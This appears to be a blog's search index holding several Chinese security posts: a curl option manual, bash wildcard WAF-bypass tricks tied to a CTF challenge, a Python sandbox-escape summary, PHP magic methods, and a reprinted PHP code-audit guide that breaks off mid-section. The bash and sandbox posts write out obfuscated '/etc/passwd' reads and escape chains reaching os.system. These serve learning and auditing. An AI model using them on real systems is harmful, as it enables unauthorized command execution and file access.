<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[curl说明书]]></title>
    <url>%2F2019%2F02%2F15%2Fcurl%E8%AF%B4%E6%98%8E%E4%B9%A6%2F</url>
    <content type="text"><![CDATA[在以下选项中，(H) 表示仅适用 HTTP/HTTPS ，(F) 表示仅适用于 FTP --anyauth 选择 &quot;any&quot; 认证方法 (H) -a, --append 添加要上传的文件 (F/SFTP) --basic 使用HTTP基础认证（Basic Authentication）(H) --cacert FILE CA 证书，用于每次请求认证 (SSL) --capath DIR CA 证书目录 (SSL) -E, --cert CERT[:PASSWD] 客户端证书文件及密码 (SSL) --cert-type TYPE 证书文件类型 (DER/PEM/ENG) (SSL) --ciphers LIST SSL 秘钥 (SSL) --compressed 请求压缩 (使用 deflate 或 gzip) -K, --config FILE 指定配置文件 --connect-timeout SECONDS 连接超时设置 -C, --continue-at OFFSET 断点续转 -b, --cookie STRING/FILE Cookies字符串或读取Cookies的文件位置 (H) -c, --cookie-jar FILE 操作结束后，要写入 Cookies 的文件位置 (H) --create-dirs 创建必要的本地目录层次结构 --crlf 在上传时将 LF 转写为 CRLF --crlfile FILE 从指定的文件获得PEM格式CRL列表 -d, --data DATA HTTP POST 数据 (H) --data-ascii DATA ASCII 编码 HTTP POST 数据 (H) --data-binary DATA binary 编码 HTTP POST 数据 (H) --data-urlencode DATA url 编码 HTTP POST 数据 (H) --delegation STRING GSS-API 委托权限 --digest 使用数字身份验证 (H) --disable-eprt 禁止使用 EPRT 或 LPRT (F) --disable-epsv 禁止使用 EPSV (F) -D, --dump-header FILE 将头信息写入指定的文件 --egd-file FILE 为随机数据设置EGD socket路径(SSL) --engine ENGINGE 加密引擎 (SSL). &quot;--engine list&quot; 指定列表 -f, --fail 连接失败时不显示HTTP错误信息 (H) -F, --form CONTENT 模拟 HTTP 表单数据提交（multipart POST） (H) --form-string STRING 模拟 HTTP 表单数据提交 (H) --ftp-account DATA 帐户数据提交 (F) --ftp-alternative-to-user COMMAND 指定替换 &quot;USER [name]&quot; 的字符串 (F) --ftp-create-dirs 如果不存在则创建远程目录 (F) --ftp-method [MULTICWD/NOCWD/SINGLECWD] 控制 CWD (F) --ftp-pasv 使用 PASV/EPSV 替换 PORT (F) -P, --ftp-port ADR 使用指定 PORT 及地址替换 PASV (F) --ftp-skip-pasv-ip 跳过 PASV 的IP地址 (F) --ftp-pret 在 PASV 之前发送 PRET (drftpd) (F) --ftp-ssl-ccc 在认证之后发送 CCC (F) --ftp-ssl-ccc-mode ACTIVE/PASSIVE 设置 CCC 模式 (F) --ftp-ssl-control ftp 登录时需要 SSL/TLS (F) -G, --get 使用 HTTP GET 方法发送 -d 数据 (H) -g, --globoff 禁用的 URL 队列 及范围使用 {} 和 [] -H, --header LINE 要发送到服务端的自定义请求头 (H) -I, --head 仅显示响应文档头 -h, --help 显示帮助 -0, --http1.0 使用 HTTP 1.0 (H) --ignore-content-length 忽略 HTTP Content-Length 头 -i, --include 在输出中包含协议头 (H/F) -k, --insecure 允许连接到 SSL 站点，而不使用证书 (H) --interface INTERFACE 指定网络接口／地址 -4, --ipv4 将域名解析为 IPv4 地址 -6, --ipv6 将域名解析为 IPv6 地址 -j, --junk-session-cookies 读取文件中但忽略会话cookie (H) --keepalive-time SECONDS keepalive 包间隔 --key KEY 私钥文件名 (SSL/SSH) --key-type TYPE 私钥文件类型 (DER/PEM/ENG) (SSL) --krb LEVEL 启用指定安全级别的 Kerberos (F) --libcurl FILE 命令的libcurl等价代码 --limit-rate RATE 限制传输速度 -l, --list-only 只列出FTP目录的名称 (F) --local-port RANGE 强制使用的本地端口号 -L, --location 跟踪重定向 (H) --location-trusted 类似 --location 并发送验证信息到其它主机 (H) -M, --manual 显示全手动 --mail-from FROM 从这个地址发送邮件 --mail-rcpt TO 发送邮件到这个接收人(s) --mail-auth AUTH 原始电子邮件的起始地址 --max-filesize BYTES 下载的最大文件大小 (H/F) --max-redirs NUM 最大重定向数 (H) -m, --max-time SECONDS 允许的最多传输时间 --metalink 处理指定的URL上的XML文件 --negotiate 使用 HTTP Negotiate 认证 (H) -n, --netrc 必须从 .netrc 文件读取用户名和密码 --netrc-optional 使用 .netrc 或 URL; 将重写 -n 参数 --netrc-file FILE 设置要使用的 netrc 文件名 -N, --no-buffer 禁用输出流的缓存 --no-keepalive 禁用 connection 的 keepalive --no-sessionid 禁止重复使用 SSL session-ID (SSL) --noproxy 不使用代理的主机列表 --ntlm 使用 HTTP NTLM 认证 (H) -o, --output FILE 将输出写入文件，而非 stdout --pass PASS 传递给私钥的短语 (SSL/SSH) --post301 在 301 重定向后不要切换为 GET 请求 (H) --post302 在 302 重定向后不要切换为 GET 请求 (H) --post303 在 303 重定向后不要切换为 GET 请求 (H) -#, --progress-bar 以进度条显示传输进度 --proto PROTOCOLS 启用/禁用 指定的协议 --proto-redir PROTOCOLS 在重定向上 启用/禁用 指定的协议 -x, --proxy [PROTOCOL://]HOST[:PORT] 在指定的端口上使用代理 --proxy-anyauth 在代理上使用 &quot;any&quot; 认证方法 (H) --proxy-basic 在代理上使用 Basic 认证 (H) --proxy-digest 在代理上使用 Digest 认证 (H) --proxy-negotiate 在代理上使用 Negotiate 认证 (H) --proxy-ntlm 在代理上使用 NTLM 认证 (H) -U, --proxy-user USER[:PASSWORD] 代理用户名及密码 --proxy1.0 HOST[:PORT] 在指定的端口上使用 HTTP/1.0 代理 -p, --proxytunnel 使用HTTP代理 (用于 CONNECT) --pubkey KEY 公钥文件名 (SSH) -Q, --quote CMD 在传输开始前向服务器发送命令 (F/SFTP) --random-file FILE 读取随机数据的文件 (SSL) -r, --range RANGE 仅检索范围内的字节 --raw 使用原始HTTP传输，而不使用编码 (H) -e, --referer Referer URL (H) -J, --remote-header-name 从远程文件读取头信息 (H) -O, --remote-name 将输出写入远程文件 --remote-name-all 使用所有URL的远程文件名 -R, --remote-time 将远程文件的时间设置在本地输出上 -X, --request COMMAND 使用指定的请求命令 --resolve HOST:PORT:ADDRESS 将 HOST:PORT 强制解析到 ADDRESS --retry NUM 出现问题时的重试次数 --retry-delay SECONDS 重试时的延时时长 --retry-max-time SECONDS 仅在指定时间段内重试 -S, --show-error 显示错误. 在选项 -s 中，当 curl 出现错误时将显示 -s, --silent Silent模式。不输出任务内容 --socks4 HOST[:PORT] 在指定的 host + port 上使用 SOCKS4 代理 --socks4a HOST[:PORT] 在指定的 host + port 上使用 SOCKSa 代理 --socks5 HOST[:PORT] 在指定的 host + port 上使用 SOCKS5 代理 --socks5-hostname HOST[:PORT] SOCKS5 代理，指定用户名、密码 --socks5-gssapi-service NAME 为gssapi使用SOCKS5代理服务名称 --socks5-gssapi-nec 与NEC Socks5服务器兼容 -Y, --speed-limit RATE 在指定限速时间之后停止传输 -y, --speed-time SECONDS 指定时间之后触发限速. 默认 30 --ssl 尝试 SSL/TLS (FTP, IMAP, POP3, SMTP) --ssl-reqd 需要 SSL/TLS (FTP, IMAP, POP3, SMTP) -2, --sslv2 使用 SSLv2 (SSL) -3, --sslv3 使用 SSLv3 (SSL) --ssl-allow-beast 允许的安全漏洞，提高互操作性(SSL) --stderr FILE 重定向 stderr 的文件位置. - means stdout --tcp-nodelay 使用 TCP_NODELAY 选项 -t, --telnet-option OPT=VAL 设置 telnet 选项 --tftp-blksize VALUE 设备 TFTP BLKSIZE 选项 (必须 &gt;512) -z, --time-cond TIME 基于时间条件的传输 -1, --tlsv1 使用 =&gt; TLSv1 (SSL) --tlsv1.0 使用 TLSv1.0 (SSL) --tlsv1.1 使用 TLSv1.1 (SSL) --tlsv1.2 使用 TLSv1.2 (SSL) --trace FILE 将 debug 信息写入指定的文件 --trace-ascii FILE 类似 --trace 但使用16进度输出 --trace-time 向 trace/verbose 输出添加时间戳 --tr-encoding 请求压缩传输编码 (H) -T, --upload-file FILE 将文件传输（上传）到指定位置 --url URL 指定所使用的 URL -B, --use-ascii 使用 ASCII/text 传输 -u, --user USER[:PASSWORD] 指定服务器认证用户名、密码 --tlsuser USER TLS 用户名 --tlspassword STRING TLS 密码 --tlsauthtype STRING TLS 认证类型 (默认 SRP) --unix-socket FILE 通过这个 UNIX socket 域连接 -A, --user-agent STRING 要发送到服务器的 User-Agent (H) -v, --verbose 显示详细操作信息 -V, --version 显示版本号并退出 -w, --write-out FORMAT 完成后输出什么 --xattr 将元数据存储在扩展文件属性中 -q .curlrc 如果作为第一个参数无效]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bash通配符与命令执行]]></title>
    <url>%2F2019%2F02%2F14%2Fbash%E9%80%9A%E9%85%8D%E7%AC%A6%E4%B8%8E%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[关于bash通配符有以下几个 ?是匹配一个任意字符.也就是说如果我们平时执行的是cat /etc/passwd可以用?来替代 例如： root@bee-box:~# which ls /bin/ls root@bee-box:~# echo /???/?s /bin/ls /bin/ps /sys/fs root@bee-box:~# 可以用/???/?s来取代.类似的cat也是可以用/???/??t或者/???/c?t等来查找到.如果在绕waf的过程里面应该是可以直接拿出来用的. root@bee-box:~# echo /???/c?t /bin/cat root@bee-box:~# echo /???/??t /bin/cat /dev/net /etc/apt /etc/opt /etc/rmt /var/opt 试试常见的cat /etc/passwd我们用/???/??t /???/??ss??来替换 cat /etc/passwd /???/??t /???/??ss?? 可以看到达到了同样的效果 在安恒月赛里出现过一道题目： 12345678910111213141516&lt;?phpinclude 'flag.php';if(isset($_GET['code']))&#123; $code = $_GET['code']; if(strlen($code)&gt;35)&#123; die("Long."); &#125; if(preg_match("/[A-Za-z0-9_$]+/",$code))&#123; die("NO."); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;//$hint = "php function getFlag() to get flag";?&gt; 字母和数字都被过滤了，我们就可以利用上面的特性 /???/??? =&gt; /bin/cat 详细的wp在安全客:https://www.anquanke.com/post/id/160582?from=singlemessage]]></content>
      <tags>
        <tag>系统总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python沙箱逃逸小结]]></title>
    <url>%2F2019%2F02%2F12%2FPython%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93%2F</url>
    <content type="text"><![CDATA[在各个技术平台浏览了许多Python沙箱逃逸的问题，这里自己记录一下 Python 沙盒所谓的 Python 沙盒，即以一定的方法模拟 Python 终端，实现用户对 Python 的使用。 Python 沙箱逃逸的一些套路导入模块Python 的内建函数中，有一些函数可以帮助我们实现任意命令执行： os.system() os.popen() commands.getstatusoutput() commands.getoutput() commands.getstatus() subprocess.call(command, shell=True) subprocess.Popen(command, shell=True) pty.spawn() 在 Python 中导入模块的方法通常有三种（xxx 为模块名称）： import xxx from xxx import * __import__(&apos;xxx&apos;) 我们可以通过上述的导入方法，导入相关模块并使用上述的函数实现命令执行。 除此之外，我们也可以通过路径引入模块： 如在 linux 系统中 Python 的 os 模块的路径一般都是在 /usr/lib/python2.7/os.py，当知道路径的时候，我们就可以通过如下的操作导入模块，然后进一步使用相关函数。 &gt;&gt;&gt; import sys &gt;&gt;&gt; sys.modules[&apos;os&apos;]=&apos;/usr/lib/python2.7/os.py&apos; &gt;&gt;&gt; import os &gt;&gt;&gt; 其他的危险函数举例 如 execfile 文件执行 &gt;&gt;&gt; execfile(&apos;/usr/lib/python2.7/os.py&apos;) &gt;&gt;&gt; system(&apos;cat /etc/passwd&apos;) root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin ... &gt;&gt;&gt; getcwd() &apos;/usr/lib/python2.7&apos; timeit import timeit timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1) exec 和 eval eval(&apos;__import__(&quot;os&quot;).system(&quot;dir&quot;)&apos;) platform import platform print platform.popen(&apos;dir&apos;).read() 正常的 Python 沙箱会以黑名单的形式禁止使用一些模块如 os 或以白名单的形式只允许用户使用沙箱提供的模块，用以阻止用户的危险操作。下面讨论一下这种情况下应该如何进行绕过 Python 的内建函数&gt;&gt;&gt; dir(__builtins__) [&apos;ArithmeticError&apos;, &apos;AssertionError&apos;, &apos;AttributeError&apos;, &apos;BaseException&apos;, &apos;BufferError&apos;, &apos;BytesWarning&apos;, &apos;DeprecationWarning&apos;, &apos;EOFError&apos;, &apos;Ellipsis&apos;, &apos;EnvironmentError&apos;, &apos;Exception&apos;, &apos;False&apos;, &apos;FloatingPointError&apos;, &apos;FutureWarning&apos;, &apos;GeneratorExit&apos;, &apos;IOError&apos;, &apos;ImportError&apos;, &apos;ImportWarning&apos;, &apos;IndentationError&apos;, &apos;IndexError&apos;, &apos;KeyError&apos;, &apos;KeyboardInterrupt&apos;, &apos;LookupError&apos;, &apos;MemoryError&apos;, &apos;NameError&apos;, &apos;None&apos;, &apos;NotImplemented&apos;, &apos;NotImplementedError&apos;, &apos;OSError&apos;, &apos;OverflowError&apos;, &apos;PendingDeprecationWarning&apos;, &apos;ReferenceError&apos;, &apos;RuntimeError&apos;, &apos;RuntimeWarning&apos;, &apos;StandardError&apos;, &apos;StopIteration&apos;, &apos;SyntaxError&apos;, &apos;SyntaxWarning&apos;, &apos;SystemError&apos;, &apos;SystemExit&apos;, &apos;TabError&apos;, &apos;True&apos;, &apos;TypeError&apos;, &apos;UnboundLocalError&apos;, &apos;UnicodeDecodeError&apos;, &apos;UnicodeEncodeError&apos;, &apos;UnicodeError&apos;, &apos;UnicodeTranslateError&apos;, &apos;UnicodeWarning&apos;, &apos;UserWarning&apos;, &apos;ValueError&apos;, &apos;Warning&apos;, &apos;ZeroDivisionError&apos;, &apos;_&apos;, &apos;__debug__&apos;, &apos;__doc__&apos;, &apos;__import__&apos;, &apos;__name__&apos;, &apos;__package__&apos;, &apos;abs&apos;, &apos;all&apos;, &apos;any&apos;, &apos;apply&apos;, &apos;basestring&apos;, &apos;bin&apos;, &apos;bool&apos;, &apos;buffer&apos;, &apos;bytearray&apos;, &apos;bytes&apos;, &apos;callable&apos;, &apos;chr&apos;, &apos;classmethod&apos;, &apos;cmp&apos;, &apos;coerce&apos;, &apos;compile&apos;, &apos;complex&apos;, &apos;copyright&apos;, &apos;credits&apos;, &apos;delattr&apos;, &apos;dict&apos;, &apos;dir&apos;, &apos;divmod&apos;, &apos;enumerate&apos;, &apos;eval&apos;, &apos;execfile&apos;, &apos;exit&apos;, &apos;file&apos;, &apos;filter&apos;, &apos;float&apos;, &apos;format&apos;, &apos;frozenset&apos;, &apos;getattr&apos;, &apos;globals&apos;, &apos;hasattr&apos;, &apos;hash&apos;, &apos;help&apos;, &apos;hex&apos;, &apos;id&apos;, &apos;input&apos;, &apos;int&apos;, &apos;intern&apos;, &apos;isinstance&apos;, &apos;issubclass&apos;, &apos;iter&apos;, &apos;len&apos;, &apos;license&apos;, &apos;list&apos;, &apos;locals&apos;, &apos;long&apos;, &apos;map&apos;, &apos;max&apos;, &apos;memoryview&apos;, &apos;min&apos;, &apos;next&apos;, &apos;object&apos;, &apos;oct&apos;, &apos;open&apos;, &apos;ord&apos;, &apos;pow&apos;, &apos;print&apos;, &apos;property&apos;, &apos;quit&apos;, &apos;range&apos;, &apos;raw_input&apos;, &apos;reduce&apos;, &apos;reload&apos;, &apos;repr&apos;, &apos;reversed&apos;, &apos;round&apos;, &apos;set&apos;, &apos;setattr&apos;, &apos;slice&apos;, &apos;sorted&apos;, &apos;staticmethod&apos;, &apos;str&apos;, &apos;sum&apos;, &apos;super&apos;, &apos;tuple&apos;, &apos;type&apos;, &apos;unichr&apos;, &apos;unicode&apos;, &apos;vars&apos;, &apos;xrange&apos;, &apos;zip&apos;] 通过该命令我们可以获取内置函数的列表 禁用import的绕过在Python里，这段[].class.mro[-1].subclasses()魔术代码，不用import任何模块，但可调用任意模块的方法。 查看Python版本 Python2.x和Python3.x有一些区别，Bypass前最好知道Python版本。 我们知道，sys.version可以查看python版本。 &gt;&gt;&gt; import sys &gt;&gt;&gt; sys.version globals该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os,sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals 属性访问全局的变量 &gt;&gt;&gt; a = lambda x:x+1 &gt;&gt;&gt; dir(a) [&apos;__call__&apos;, &apos;__class__&apos;, &apos;__closure__&apos;, &apos;__code__&apos;, &apos;__defaults__&apos;, &apos;__delattr__&apos;, &apos;__dict__&apos;, &apos;__doc__&apos;, &apos;__format__&apos;, &apos;__get__&apos;, &apos;__getattribute__&apos;, &apos;__globals__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__module__&apos;, &apos;__name__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;func_closure&apos;, &apos;func_code&apos;, &apos;func_defaults&apos;, &apos;func_dict&apos;, &apos;func_doc&apos;, &apos;func_globals&apos;, &apos;func_name&apos;] &gt;&gt;&gt; a.__globals__ {&apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None, &apos;a&apos;: &lt;function &lt;lambda&gt; at 0x7fcd7601ccf8&gt;, &apos;__package__&apos;: None} &gt;&gt;&gt; a.func_globals {&apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None, &apos;a&apos;: &lt;function &lt;lambda&gt; at 0x7f1095d72cf8&gt;, &apos;__package__&apos;: None} (lambda x:1).__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).system(&apos;ls&apos;)&quot;) _globals__ 是一个字典，默认有builtins对象，在python sandbox中一般会过滤builtins内容，这样globals里面的builtins也就没有什么意义了,即使重新import builtin 还是一样. 执行系统命令在python2.7.10里，[].class.base.subclasses() 里面有很多库调用了我们需要的模块os /usr/lib/python2.7/warning.py 58 &lt;class &apos;warnings.WarningMessage&apos;&gt; 59 &lt;class &apos;warnings.catch_warnings&apos;&gt; /usr/lib/python2.7/site.py 71 &lt;class &apos;site._Printer&apos;&gt; 72 &lt;class &apos;site._Helper&apos;&gt; 76 &lt;class &apos;site.Quitter&apos;&gt; 我们来看一下/usr/lib/python2.7/warning.py导入的模块 import linecache import sys import types 跟踪linecache文件/usr/lib/python2.7/linecache.py import sysimport os 于是一个利用链就可以构造了: [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;ls&apos;) [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].system(&apos;ls&apos;)]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[置顶-项目发布-莫离新版授权系统]]></title>
    <url>%2F2019%2F02%2F11%2F%E7%BD%AE%E9%A1%B6-%E9%A1%B9%E7%9B%AE%E5%8F%91%E5%B8%83-%E8%8E%AB%E7%A6%BB%E6%96%B0%E7%89%88%E6%8E%88%E6%9D%83%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[该项目已发布到各大论坛，公益作品请勿盗用二开 本系统可作为多款产品的网络验证程序，对接性灵活，UI界面取自原生彩虹登录界面 系统支持添加代理商和高级代理商 更换授权信息时需要进行主人身份验证，大大增强了系统的安全性 默认添加机器人对接接口，其他程序对接自行修改根目录下的yunsq.php文件即可 配置方法： 数据库信息配置文件请修改 includes\config.php 然后导入install.sql 超级管理员后台路径为 /qq80743522/login.php 代理商与高级代理商后台路径为 /user/login.php 项目地址：https://github.com/yemoli/yemoli-auth]]></content>
      <tags>
        <tag>项目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP常用魔术方法]]></title>
    <url>%2F2019%2F02%2F11%2FPHP%E5%B8%B8%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[PHP将所有以 __ （两个下划线）开头的类方法保留为魔术方法。下面记录一下常用的魔术方法： __sleep在使用 serialize() 函数时，程序会检查类中是否存在一个 __sleep() 魔术方法。如果存在，则该方法会先被调用，然后再执行序列化操作。 __wakeup在使用 unserialize() 时，会检查是否存在一个 __wakeup() 魔术方法。如果存在，则该方法会先被调用，预先准备对象需要的资源。 __toString__toString() 方法用于定义一个类被当成字符串时该如何处理。 123456789101112131415161718&lt;?phpclass TestClass&#123; public $foo; public function __construct($foo) &#123; $this-&gt;foo = $foo; &#125; public function __toString() &#123; return $this-&gt;foo; &#125;&#125;$class = new TestClass('Hello');echo $class; // 运行结果：Hello?&gt; __invoke1234567891011&lt;?phpclass CallableClass &#123; function __invoke($x) &#123; var_dump($x); &#125;&#125;$obj = new CallableClass;$obj(5);var_dump(is_callable($obj));?&gt; __construct具有 __construct 函数的类会在每次创建新对象时先调用此方法，适合在使用对象之前做一些初始化工作。 __destruct__destruct 函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行 __set给不可访问属性赋值时，__set() 会被调用。 __get读取不可访问属性的值时，__get() 会被调用。 __isset对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。 __unset对不可访问属性调用 unset() 时，__unset() 会被调用。 __call在对象中调用一个不可访问方法时，__call() 会被调用。 123456789101112131415&lt;?phpclass MethodTest&#123; public function __call($name, $arguments)&#123; // Note: value of $name is case sensitive. echo "Triggering __call method when calling method '$name' with arguments '" . implode(', ', $arguments). "'.\n"; &#125;&#125;$obj = new MethodTest;$obj-&gt;callTest('arg1','arg2');/*运行结果Triggering __call method when calling method 'callTest' with arguments 'arg1, arg2'.*/?&gt; __callStatic在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用。 12345678910111213&lt;?phpclass MethodTest&#123; public static function __callStatic($name, $arguments)&#123; // Note: value of $name is case sensitive. echo "Triggering __call method when calling method '$name' with arguments '" . implode(', ', $arguments). "'.\n"; &#125;&#125;MethodTest::callStaticTest('arg3','arg4'); // As of PHP 5.3.0/*运行结果Triggering __call method when calling method 'callStaticTest' with arguments 'arg3, arg4'.*/?&gt;]]></content>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[转载-PHP代码审计]]></title>
    <url>%2F2019%2F02%2F09%2F%E8%BD%AC%E8%BD%BD-PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[代码审计（Code audit）是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。 学习代码审计的目标是能够独立完成对代码安全监测。其通用的思路有： 通读全文代码，从功能函数代码开始阅读，例如include文件夹下的common_fun.php，或者有类似关键字的文件。 看配置文件，带有config关键字的文件，找到mysql.class.php文件的connect()函数，查看在数据库连接时是否出现漏洞。 继续跟读首页文件index.php，了解程序运作时调用了哪些函数和文件 以index.php文件作为标线，一层一层去扩展阅读所包含的文件，了解其功能，之后进入其功能文件夹的首页文件，进行扩展阅读。 一、输入输出验证用户的一切输入都是有害的，大多数漏洞的形成原因主要都是未对输入数据进行安全验证或对输出数据未经过安全处理。 所以我们需要针对输入输出数据进行以下的安全检查： 对数据进行精确匹配 接受白名单的数据 拒绝黑名单的数据 对匹配黑名单的数据进行编码 在PHP中，能够由用户输入的变量有： 12345678910111213$_SERVER$_GET$_POST$_COOKIE$_REQUEST$_FILES$_ENV$_HTTP_COOKIE_VARS$_HTTP_ENV_VARS$_HTTP_GET_VARS$_HTTP_POST_FILES$_HTTP_POST_VARS$_HTTP_SERVER_VARS 我们需要针对这些函数进行必要的安全检查。 1. XSS反射型XSS出现在接受用户提交的变量后进行处理，直接输出显示给酷护短，存储型XSS出现在用户提交的变量进行处理后存储到数据库中，再从数据库中读取这条信息输出到客户端。 对于反射型XSS，应当在当前的PHP页面检查变量被提交时是否经过了安全检查，是否在当前的PHP页面有立即显示。 对于存储型XSS，首先对于输入的数据进行安全检查后再写入数据库，在输出显示时是否有安全检查。 防御策略： 对输入的数据进行严格的匹配，过滤所有的非法字符进行过滤。 对于输出的数据进行HTML编码， 123456789&lt; → &amp;lt;&gt; → &amp;gt;( → &amp;#40;) → &amp;#41;# → &amp;#35&amp; → &amp;amp;" → &amp;quot;’ → &amp;apos;` → %60 2.SQL注入SQL注入关系到的是数据库安全，所以对于用户的恶意输入必须做严格的过滤。 在SQL注入攻击中，一般会用到 ’、select、insert、delete、from、=、in、update等关键字，需要针对这些字符进行过滤，要查看传递的变量参数是否用户可控制，以及它们是否做到安全检查。 防御策略： 使用参数化查询 3. 文件上传任意文件上传可能会造成网站getshell，也是一个非常危险的功能，对于文件上传也需要非常警惕。 PHP的文件上传通常会使用move_uploaded_file()函数，在文件上传的位置也需要进行上传文件的检测，做好安全检查。 防御策略： 使用白名单检测上传文件后缀。 上传后随机生成文件名称。 上传目录限制文件不可执行。 注意防范%00进行的截断。 4. 文件包含文件包含漏洞可以读取敏感文件，配合文件上传功能可以得到webshell,远程文件包含可以直接远程包含shell。 PHP可能出现文件包含的函数：include、include_once、require、require_once、show_source、highlight_file、readfile、file_get_contents、fopen、file。 防御策略： 对输入数据进行精确匹配。 过滤参数中的/、..等字符。 5. 命令注入php执行系统命令可以使用以下几个函数：system、exec、passthru、“、shell_exec、popen、proc_open、pcntl_exec。 我们通过在全部程序文件中搜索这些函数，确定函数的参数是否会因为外部提交而改变，检查这些参数是否有经过安全处理。 防御策略： 使用自定义函数或函数库来替代外部命令的功能。 使用escapeshellarg函数来处理命令参数。 使用safe_mode_exec_dir指定可执行文件的路径。 6. 代码注入PHP可能出现代码注入的函数：eval、preg_replace+/e、assert、call_user_func、call_user_func_array、create_function。 查找程序中程序中使用这些函数的地方，检查提交变量是否用户可控，有无做输入验证 防御策略： 输入数据精确匹配。 使用白名单过滤可执行的函数。 7. 文件管理PHP的用于文件管理的函数，如果输入变量可由用户提交，程序中也没有做数据验证，可能成为高危漏洞。我们应该在程序中搜索如下函数：copy、rmdir、unlink、delete、fwrite、chmod、fgetc、 fgetcsv、fgets、fgetss、file、file_get_contents、fread、readfile、ftruncate、 file_put_contents、fputcsv、fputs，但通常PHP中每一个文件操作函数都可能是危险的。 防御策略： 对提交数据进行严格匹配。 限定文件可操作的目录。 8. 变量覆盖PHP的变量覆盖会出现在以下集中情况： 遍历初始化变量 函数覆盖变量parse_str、mb_parse_str、import_request_variables 3.Register_globals=ON时，GET方式提交变量会直接覆盖 防御策略： 设置Register_globals=OFF。 不使用覆盖变量的函数来获取变量。 二、会话安全1. HTTPOnly设置打开该指令可以有效预防通过XSS攻击劫持会话ID。 2. domain设置检查session.cookie_domain是否只包含本域，如果是父域，则其他子域能够获取本域的cookies。 3. path设置检查session.cookie_path，如果网站本身应用在/app，则path必须设置为/app/，才能保证安全。 4. cookies持续时间检查session.cookie_lifetime，如果时间设置过程过长，即使用户关闭浏览器，攻击者也会危害到帐户安全。 5. secure设置如果使用HTTPS，那么应该设置session.cookie_secure=ON，确保使用HTTPS来传输cookies。 6. session固定如果当权限级别改变时（例如核实用户名和密码后，普通用户提升到管理员），我们就应该修改即将重新生成的会话ID，否则程序会面临会话固定攻击的风险。 7. CSRF跨站请求伪造攻击，是攻击者伪造一个恶意请求链接，通过各种方式让正常用户访问后，会以用户的身份执行这些恶意的请求。我们应该对比较重要的程序模块，比如修改用户密码，添加用户的功能进行审查，检查有无使用一次性令牌防御csrf攻击。 三、加密1. 明文存储密码采用明文的形式存储密码会严重威胁到用户、应用程序、系统安全。 2. 密码弱加密使用容易破解的加密算法，MD5加密已经部分可以利用md5破解网站来破解。 3. 密码存储在攻击者能访问到的文件例如：保存密码在txt、ini、conf、inc、xml等文件中，或者直接写在HTML注释中。 四、认证和授权1. 用户认证检查代码进行用户认证的位置，是否能够绕过认证，例如：登录代码可能存在表单注入。 检查登录代码有无使用验证码等，防止暴力破解的手段。 2. 函数或文件的未认证调用一些管理页面是禁止普通用户访问的，有时开发者会忘记对这些文件进行权限验证，导致漏洞发生 某些页面使用参数调用功能，没有经过权限验证，比如index.php?action=upload。 3. 密码硬编码有的程序会把数据库链接账号和密码，直接写到数据库链接函数中。 五、PHP危险函数1. 缓冲区溢出（1）confirm_phpdoc_compiled 影响版本： phpDocumentor phpDocumentor 1.3.1 phpDocumentor phpDocumentor 1.3 RC4 phpDocumentor phpDocumentor 1.3 RC3 phpDocumentor phpDocumentor 1.2.3 phpDocumentor phpDocumentor 1.2.2 phpDocumentor phpDocumentor 1.2.1 phpDocumentor phpDocumentor 1.2 （2）mssql_pconnect/mssql_connect 影响版本：PHP &lt; = 4.4.6 （3）crack_opendict 影响版本：PHP = 4.4.6 （4）snmpget 影响版本：PHP &lt;= 5.2.3 （5）ibase_connect 影响版本：PHP = 4.4.6 （6）unserialize 影响版本：PHP 5.0.2、PHP 5.0.1、PHP 5.0.0、PHP 4.3.9、PHP 4.3.8、PHP 4.3.7、PHP 4.3.6、PHP 4.3.3、PHP 4.3.2、PHP 4.3.1、PHP 4.3.0、PHP 4.2.3、PHP 4.2.2、PHP 4.2.1、PHP 4.2.0、PHP 4.2-dev、PHP 4.1.2、PHP 4.1.1、PHP 4.1.0、PHP 4.1、PHP 4.0.7、PHP 4.0.6、PHP 4.0.5、PHP 4.0.4、PHP 4.0.3pl1、PHP 4.0.3、PHP 4.0.2、PHP 4.0.1pl2、PHP 4.0.1pl1、PHP 4.0.1 2. session_destroy()删除文件漏洞影响版本：不祥，需要具体测试。 测试代码如下： 